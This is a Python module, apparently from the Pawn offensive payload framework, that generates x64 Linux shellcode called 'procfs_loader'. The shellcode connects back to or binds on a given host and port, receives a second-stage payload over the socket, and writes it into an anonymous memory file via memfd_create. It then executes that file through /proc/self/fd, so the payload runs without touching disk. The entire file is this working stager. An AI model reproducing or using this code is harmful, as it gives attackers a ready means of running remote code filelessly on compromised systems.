"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from typing import Optional
from textwrap import dedent

from pex.assembler import Assembler
from pex.socket import Socket

from pawn.lib.module import Module


class PawnModule(Module, Socket, Assembler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "linux/x64/procfs_loader",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
                'Tomas Globis (Tomasglgg) - payload developer'
            ],
            'Architecture': "x64",
            'Platform': "linux"
        }

    def run(self, host: str, port: int, bind: bool = False,
            length: Optional[int] = None, reliable: bool = True) -> bytes:
        payload = dedent("""\
            start:
                push 0x29
                pop rax
                cdq
                push 0x2
                pop rdi
                push 0x1
                pop rsi
                syscall
        """)

        port = self.pack_port(port)

        if not bind:
            host = self.pack_host(host)

            payload += dedent(f"""\
                    xchg rdi, rax
                    movabs rcx, 0x{host.hex()}{port.hex()}0002
                    push rcx
                    mov rsi, rsp
                    push 0x10
                    pop rdx
                    push 0x2a
                    pop rax
                    syscall
            """)

        else:
            payload += dedent(f"""\
                    xchg rdi, rax
                    push rdx
                    mov dword ptr [rsp], 0x{port.hex()}0002
                    mov rsi, rsp
                    push 0x10
                    pop rdx
                    push 0x32
                    pop rax
                    syscall
            """)

        if length:
            payload += dedent(f"""\
                    push 0x{length.to_bytes(8, 'little').hex()}
            """)

        else:
            payload += dedent(f"""\
                    push 0x8
                    pop rdx
                    push 0x0
                    lea rsi, [rsp]
                    xor rax, rax
                    syscall
            """)

        payload += dedent("""\
                pop r12
                push rdi
                pop r13

                xor rax, rax
                push rax
                push rsp
                sub rsp, 8
                mov rdi, rsp
                push 0x13f
                pop rax
                xor rsi, rsi
                syscall

                push rax
                pop r14

                push 0x9
                pop rax
                xor rdi, rdi
                push r12
                pop rsi
                push 0x7
                pop rdx
                xor r9, r9
                push 0x22
                pop r10
                syscall

                push rax
                pop r15
        """)

        if reliable:
            payload += dedent(f"""\
                    test rax, rax
                    js fail
            """)

        payload += dedent(f"""\
                push 0x2d
                pop rax
                push r13
                pop rdi
                push r15
                pop rsi
                push r12
                pop rdx
                push 0x100
                pop r10
                syscall

                push 0x1
                pop rax
                push r14
                pop rdi
                push r12
                pop rdx
                syscall

                add rsp, 16
                mov qword ptr [rsp], 0x6f72702f
                mov qword ptr [rsp+4], 0x65732f63
                mov qword ptr [rsp+8], 0x662f666c
                mov qword ptr [rsp+12], 0x002f64
                push r14
                pop rax
                lea rbx, [rsp+14]
                push 0x10
                pop rcx
                xor rdi, rdi
                push rax
                pop rsi

            number_len_loop:
                xor rdx, rdx
                div rcx
                inc rdi
                test rax, rax
                jnz number_len_loop

            convert_loop:
                xor dx, dx
                div rcx
                add dx, 48
                or [rbx+rdi], dx
                dec rdi

                test rax, rax
                jnz convert_loop

            end:
                lea rdi, [rsp]
                push 0x3b
                pop rax
                cdq
                push rdx
                push rdi
                mov rsi, rsp
                syscall
        """)

        if reliable:
            payload += dedent("""\
                fail:
                    push 0xb
                    pop rax
                    push r15
                    pop rdi
                    push r12
                    pop rsi
                    syscall

                    push 0x3
                    pop rax
                    push r14
                    pop rdi
                    syscall

                    push r13
                    pop rdi
                    syscall

                    push 0x3c
                    pop rax
                    xor rdi, rdi
                    syscall
            """)

        return self.assemble(
            self.details['Architecture'], payload)
